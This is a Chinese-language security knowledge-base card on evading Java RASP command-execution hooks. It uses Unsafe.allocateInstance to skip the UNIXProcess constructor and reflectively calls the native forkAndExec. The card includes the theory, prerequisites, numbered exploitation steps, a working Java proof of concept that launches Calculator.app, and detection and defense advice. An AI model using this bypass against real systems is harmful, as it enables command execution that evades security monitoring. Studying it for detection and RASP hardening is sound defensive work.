---
id: web-java-rce-unsafe-allocateinstance-unixprocess-forkandexec
title: Unsafe.allocateInstance 绕过 Process 构造器 hook：反射调用 UNIXProcess.forkAndExec 直接创建进程
type: scenario
domain: web
path: web/java/rce
technique: unsafe-allocateinstance-unixprocess-forkandexec
tags:
- java
- rce
- unsafe
- native
- forkandexec
- rasp
- bypass
- command-execution
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V482
  verified_at: '2026-11-10T20:52:05+08:00'
  notes: 已对照原文与30张幻灯片逐张核对：slide17 RASP 拦截 UNIXProcess#<init>/ProcessImpl#<init>、slide18 forkAndExec native 声明、slide19 Unsafe.allocateInstance、slide20 反射 theUnsafe→allocateInstance(UNIXProcess)→反射 forkAndExec 并以 mode=2/helperpath/open→Calculator.app/fds{-1,-1,-1} 调用，卡内原理与 PoC 与幻灯片代码逐行一致；macOS JDK8 示例、Linux/JDK 版本签名差异、JDK9+ 模块封装限制均已注明。--force 核对：dedup 与既有 web-java-rce-processimpl-constructor-reflect-exec 为 likely_duplicate/append_scenario，但后者核心是反射调用 ProcessImpl 私有构造器（正是 RASP 常 hook 点），本卡用 allocateInstance 完全跳过构造器并直调 native forkAndExec，平台示例（macOS UNIXProcess）与触发条件不同，dedup_review 理由成立，按 append_scenario 保留并列非同一原子。原文未标受影响版本，affected_versions 留空正确。未验证点：PoC 未在本机按目标 JDK 签名适配复跑；allocateInstance 得到的零初始化实例字段（helperpath=null）在 macOS 实际可执行性未验证（卡内已要求按目标 javap 适配）。path web/java/rce 存在；无 sources/source_url/文章ID/URL/长段摘录。
url: /docs/web/java/rce/web-java-rce-unsafe-allocateinstance-unixprocess-forkandexec/
draft: false
kb_aliases:
- Unsafe 实例化 UNIXProcess
- allocateInstance 绕过构造器 hook
- 反射调用 forkAndExec
- native 方法绕过 RASP
- UNIXProcess 构造器拦截绕过
---

## 一句话结论

当 RASP 把命令执行 hook 挂在 `java.lang.UNIXProcess#<init>` / `ProcessImpl#<init>` 构造器上时，普通 `new` 或反射调构造器都会命中拦截；用 `sun.misc.Unsafe.allocateInstance()` 绕过构造器创建 `UNIXProcess` 实例，再反射调用其私有 native 方法 `forkAndExec`，即可在 JVM 内直接创建进程执行命令，调用栈中不出现被 hook 的构造器。

## 原理

- **RASP 的命令执行 hook 落点**：常见于 `Runtime.exec`、`ProcessBuilder.start`、`ProcessImpl.start`，以及更底层的 `UNIXProcess#<init>` / `ProcessImpl#<init>` 构造器。只要通过 `new` 或反射构造器创建进程对象，构造器级 hook 都会命中。
- **`Unsafe.allocateInstance` 的作用**：它是 `sun.misc.Unsafe` 的 native 方法，只分配对象内存并把字段置零，不执行任何构造器；因此 `allocateInstance(UNIXProcess.class)` 得到实例的过程不会触发 `<init>` 上的 RASP 逻辑。
- **真正的进程创建在 native 方法**：JDK 8 macOS 上 `java.lang.UNIXProcess` 的私有 native 方法为 `forkAndExec(int mode, byte[] helperpath, byte[] prog, byte[] argBlock, int argc, byte[] envBlock, int envc, byte[] dir, int[] fds, boolean redirectErrorStream)`；Linux 及不同 JDK 版本签名可能不同（可能没有 `helperpath`），需用 `javap -p` 按目标实际签名适配。
- **反射调用 native**：`setAccessible(true)` 后直接 invoke `forkAndExec`，传入 mode、程序路径、argv 块（NUL 分隔）、env、工作目录、fd 数组与重定向标志，即可创建进程；因为直接进 native 方法，不经过任何被 hook 的 Java Process API 或构造器。
- **关键参数**：示例 `mode=2`（spawn 语义），`prog` 为可执行文件路径，`argBlock` 为以 `\0` 分隔的 argv（第一个通常是程序名），`fds={-1,-1,-1}` 表示继承标准输入/输出/错误；macOS 还需从实例字段读出 `helperpath` 一并传入。示例最终拉起 `/System/Applications/Calculator.app`。
- **为什么成立**：`allocateInstance` 不跑构造器，`forkAndExec` 是进程创建在 JVM 内的最终落点之一；RASP 只覆盖构造器/Java API 时，这条路径完全落在监控之外。
- **限制**：`sun.misc.Unsafe.theUnsafe` 在 JDK 8 可直接反射获取；JDK 9+ 强封装下可能需要 `--add-opens` 或改用其他 Unsafe 入口；`UNIXProcess`/`forkAndExec` 的存在与签名随 JDK 与平台变化（Windows 为 `ProcessImpl` + `create`，机制不同），必须先确认目标版本。

## 触发条件

- 已获得任意 Java 代码执行能力（JSP、反序列化、表达式注入、内存马等）。
- 目标 RASP 对 `UNIXProcess`/`ProcessImpl` 构造器或 Java Process API 做了 hook，但未拦截 `Unsafe.allocateInstance` 与对 native `forkAndExec` 的反射调用。
- JDK 允许反射访问 `sun.misc.Unsafe` 与 `java.lang.UNIXProcess` 私有成员（JDK 8 默认可；高版本需模块开放）。
- 目标为 Linux/macOS 等使用 `UNIXProcess` 的平台；Windows 需换 `ProcessImpl.create` 等价路径。

## 利用步骤

1. 用 `javap -p java.lang.UNIXProcess`（或 `ProcessImpl`）确认 `forkAndExec` 的实际签名、参数顺序与字段名。
2. 反射取 `Unsafe.class.getDeclaredField("theUnsafe")`，`setAccessible(true)` 后取得 Unsafe 实例。
3. `unsafe.allocateInstance(UNIXProcess.class)` 创建未初始化实例（不触发构造器）。
4. 反射取私有 native `forkAndExec` 并 `setAccessible(true)`。
5. 准备参数：mode、prog 绝对路径、argv 块、env 块、工作目录、`fds={-1,-1,-1}`、`redirectErrorStream`；若签名含 `helperpath`，从实例字段读取。
6. invoke 执行；需要回显时使用管道 fd，或让命令写文件/反连。

## PoC

```java
import java.lang.reflect.*;
import sun.misc.Unsafe;

public class CallNative {
    public static void main(String[] args) throws Exception {
        Class<?> unixClass = Class.forName("java.lang.UNIXProcess");

        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        Unsafe unsafe = (Unsafe) f.get(null);
        Object obj = unsafe.allocateInstance(unixClass);          // 不执行构造器

        Method m = unixClass.getDeclaredMethod("forkAndExec",
            int.class, byte[].class, byte[].class, byte[].class, int.class,
            byte[].class, int.class, byte[].class, int[].class, boolean.class);
        m.setAccessible(true);

        Field p = unixClass.getDeclaredField("helperpath");
        p.setAccessible(true);
        Object helperpath = p.get(obj);

        m.invoke(obj, 2, helperpath,
            "open\u0000".getBytes(),
            "/System/Applications/Calculator.app/\u0000".getBytes(),
            1, null, 0, null, new int[]{-1, -1, -1}, false);
    }
}
```

参数签名与路径需按目标 JDK/平台调整；Linux 上通常不需要 `helperpath`，且 `prog`/argv 要换成 `/bin/sh` 与 `sh -c id`。

## 变体与关联

- **平台/版本变体**：Linux JDK 8 的 `UNIXProcess.forkAndExec` 参数集不同；JDK 9+ 内部实现变化，可能需要改用 `ProcessImpl` 或其他 native 入口；Windows 的 `ProcessImpl` 使用 native `create`。
- **Unsafe 获取变体**：JDK 高版本可通过 `jdk.internal.misc.Unsafe`、`MethodHandles` 或 `--add-opens` 取得等价能力。
- 关联：[[web-java-rce-processimpl-constructor-reflect-exec]]（反射构造器路径，会被构造器 hook 拦）、[[web-java-rce-ffm-native-system-rasp-bypass]]（Java FFM 直调 libc）、[[web-java-rce-reflect-classloader-nativelibrary-load-dll-bypass-hooks]]（原生库加载）、[[web-java-rce-rasp-http-thread-context-new-thread-bypass]]（线程上下文绕过）。
- 边界：强模块封装拒绝 `setAccessible`、RASP 拦截 native 方法调用或监控 `fork/execve` 系统调用、目标平台为 Windows 且未做适配时失效。

## 检测与防御

- **检测**：对 `sun.misc.Unsafe.allocateInstance` 与 `java.lang.UNIXProcess`/`ProcessImpl` 私有方法的反射调用告警；观察 `forkAndExec` 被调用但调用栈中没有构造器/ProcessBuilder 帧；JVM 出现子进程而业务日志无对应 Process 创建记录。
- **防御**：RASP 不能只 hook 构造器/Java API，应同时拦截 native 方法（例如用 NativeMethodPrefix 把 `forkAndExec` 映射到带 RASP 逻辑的包装实现）并监控 OS 层 `fork`/`execve`；JDK 保持强封装、禁止随意 `--add-opens`；用 seccomp/AppArmor/EDR 限制 Java 进程创建子进程。
